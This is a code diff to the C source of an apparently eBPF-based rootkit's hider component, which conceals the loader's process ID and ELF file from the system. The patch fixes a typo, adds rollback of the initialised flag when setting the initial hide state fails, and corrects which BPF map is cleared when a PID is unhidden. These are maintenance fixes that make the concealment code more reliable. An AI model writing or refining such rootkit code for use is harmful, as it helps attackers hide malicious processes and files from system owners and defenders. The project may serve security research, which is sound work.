@@ -137,7 +137,7 @@ static int hide_bpf(hider_context_t *hider_ctx) {
 }
 
 /**
- * @brief Set the initail hide state of the rootkit.
+ * @brief Set the initial hide state of the rootkit.
  *
  * It sets the loader PID and the loader's elf file to hide.
  *
@@ -183,6 +183,8 @@ int hider_init(hider_context_t *hider_ctx) {
     if (!hider_ctx->skel)
         return -EINVAL;
 
+    int ret = 0;
+
     hider_ctx->hide_names_map_fd = bpf_map__fd(hider_ctx->skel->maps.hide_names_map);
     if (hider_ctx->hide_names_map_fd < 0)
         return -EINVAL;
@@ -201,7 +203,11 @@ int hider_init(hider_context_t *hider_ctx) {
 
     hider_ctx->is_initialized = true;
 
-    return set_initial_hide_state(hider_ctx);
+    ret = set_initial_hide_state(hider_ctx);
+    if (ret)
+        hider_ctx->is_initialized = false;
+
+    return ret;
 }
 
 int hider_hide_pid(hider_context_t *hider_ctx, pid_t pid) {
@@ -265,7 +271,7 @@ int hider_unhide_pid(hider_context_t *hider_ctx, pid_t pid) {
     if (ret)
         return ret;
 
-    return delete_uint32_map(hider_ctx->hide_names_map_fd, (uint32_t)pid);
+    return delete_uint32_map(hider_ctx->tracked_pids_map_fd, (uint32_t)pid);
 }
 
 int hider_unhide_file(hider_context_t *hider_ctx, const char *filename) {
